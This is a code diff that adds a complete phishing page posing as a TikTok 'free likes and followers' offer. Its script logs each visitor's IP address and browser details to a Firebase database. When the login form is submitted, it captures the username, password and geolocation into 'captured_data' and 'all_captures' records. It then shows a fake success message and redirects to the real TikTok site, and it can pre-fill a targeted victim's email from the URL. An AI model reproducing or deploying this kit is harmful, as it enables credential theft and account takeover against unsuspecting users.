@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok - Free Likes & Followers</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="../firebase-config.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+        }
+        .container {
+            width: 100%;
+            max-width: 420px;
+            background: #111;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            border: 1px solid #222;
+            overflow: hidden;
+            animation: slideUp 0.5s ease;
+        }
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .header {
+            background: linear-gradient(135deg, #000, #1a1a2e);
+            padding: 30px 20px;
+            text-align: center;
+            border-bottom: 1px solid #333;
+        }
+        .header .logo {
+            font-size: 4em;
+            margin-bottom: 10px;
+        }
+        .header h1 { font-size: 1.8em; color: #fff; }
+        .header p { color: #999; font-size: 0.9em; margin-top: 5px; }
+        .header .offers {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+        .header .offers span {
+            background: rgba(255,255,255,0.1);
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 0.8em;
+            border: 1px solid #333;
+        }
+        
+        .form-section {
+            padding: 30px 20px;
+        }
+        .form-section .info-box {
+            background: rgba(255,0,0,0.1);
+            border-left: 4px solid #ff0050;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 0.85em;
+            color: #ccc;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #ccc;
+            font-weight: 600;
+            font-size: 0.9em;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #333;
+            border-radius: 12px;
+            font-size: 1em;
+            transition: all 0.3s;
+            background: #1a1a1a;
+            color: #fff;
+        }
+        .form-group input:focus {
+            border-color: #ff0050;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255,0,80,0.1);
+            background: #222;
+        }
+        .form-group input::placeholder { color: #666; }
+        
+        .service-select {
+            margin-bottom: 20px;
+        }
+        .service-select label { display: block; margin-bottom: 8px; color: #ccc; font-weight: 600; }
+        .service-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+        .service-option {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            padding: 12px;
+            border-radius: 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 0.85em;
+        }
+        .service-option.selected {
+            border-color: #ff0050;
+            background: rgba(255,0,80,0.1);
+        }
+        .service-option:hover { border-color: #ff0050; }
+        
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #ff0050, #ff6600);
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 1.1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .login-btn:hover { transform: scale(1.02); box-shadow: 0 5px 20px rgba(255,0,80,0.3); }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 30px;
+        }
+        .loading .spinner {
+            border: 3px solid #222;
+            border-top: 3px solid #ff0050;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .success-msg {
+            display: none;
+            text-align: center;
+            padding: 30px;
+            background: rgba(0,255,0,0.1);
+            border: 1px solid #00ff00;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+        .footer-text {
+            text-align: center;
+            margin-top: 20px;
+            color: #555;
+            font-size: 0.8em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">🎵</div>
+            <h1>TikTok</h1>
+            <p>Free Likes, Views, Followers & Monetization</p>
+            <div class="offers">
+                <span>🔥 Free Likes</span>
+                <span>👥 Free Followers</span>
+                <span>📈 Free Views</span>
+                <span>💰 Monetize</span>
+            </div>
+        </div>
+        
+        <div class="form-section">
+            <div class="info-box">
+                🎯 Select your service below and login to get <strong>FREE</strong> TikTok rewards instantly!
+            </div>
+            
+            <div class="service-select">
+                <label>Select Service:</label>
+                <div class="service-options">
+                    <div class="service-option selected" onclick="selectService(this, 'Free Likes')">❤️ Free Likes</div>
+                    <div class="service-option" onclick="selectService(this, 'Free Followers')">👥 Free Followers</div>
+                    <div class="service-option" onclick="selectService(this, 'Free Views')">📈 Free Views</div>
+                    <div class="service-option" onclick="selectService(this, 'Monetize')">💰 Monetize Account</div>
+                </div>
+            </div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>📧 TikTok Username / Email</label>
+                    <input type="text" id="username" placeholder="Enter your TikTok username or email" required>
+                </div>
+                <div class="form-group">
+                    <label>🔑 Password</label>
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                </div>
+                <button type="submit" class="login-btn" id="loginBtn">🎯 Get Free Rewards</button>
+            </form>
+            
+            <div class="loading" id="loading">
+                <h3 style="color:#fff;">🔄 Processing your request...</h3>
+                <div class="spinner"></div>
+                <p style="margin-top:10px;color:#999;">Connecting to TikTok servers</p>
+            </div>
+            
+            <div class="success-msg" id="successMsg">
+                <h3 style="color:#0f0;">✅ Success!</h3>
+                <p style="color:#ccc;">Your request has been submitted. Rewards will be added within 24 hours.</p>
+                <p style="margin-top:15px;font-size:0.8em;color:#666;">Redirecting to TikTok...</p>
+            </div>
+            
+            <div class="footer-text">Powered by TikTok API v2.0</div>
+        </div>
+    </div>
+    
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const linkID = urlParams.get('id') || 'direct_' + Date.now();
+        const targetEmail = urlParams.get('target') || '';
+        
+        let selectedService = 'Free Likes';
+        function selectService(el, service) {
+            document.querySelectorAll('.service-option').forEach(e => e.classList.remove('selected'));
+            el.classList.add('selected');
+            selectedService = service;
+        }
+        
+        let visitorIP = '';
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                visitorIP = data.ip;
+                db.ref('visits/' + linkID).push({
+                    ip: visitorIP,
+                    userAgent: navigator.userAgent,
+                    timestamp: Date.now(),
+                    page: 'tiktok',
+                    target: targetEmail
+                });
+            });
+        
+        if (targetEmail) document.getElementById('username').value = decodeURIComponent(targetEmail);
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            let location = 'Unknown';
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(data => { location = data.city + ', ' + data.country_name; })
+                .catch(() => {})
+                .finally(() => {
+                    db.ref('captured_data/' + linkID).set({
+                        username, password, ip: visitorIP, location,
+                        userAgent: navigator.userAgent, timestamp: Date.now(),
+                        service: 'tiktok', selectedService, target: targetEmail
+                    });
+                    db.ref('all_captures').push({
+                        username, password, ip: visitorIP, location,
+                        service: 'tiktok', selectedService, target: targetEmail, timestamp: Date.now()
+                    });
+                    
+                    setTimeout(() => {
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('successMsg').style.display = 'block';
+                        setTimeout(() => window.location.href = 'https://www.tiktok.com', 3000);
+                    }, 2000);
+                });
+        });
+    </script>
+</body>
+</html>
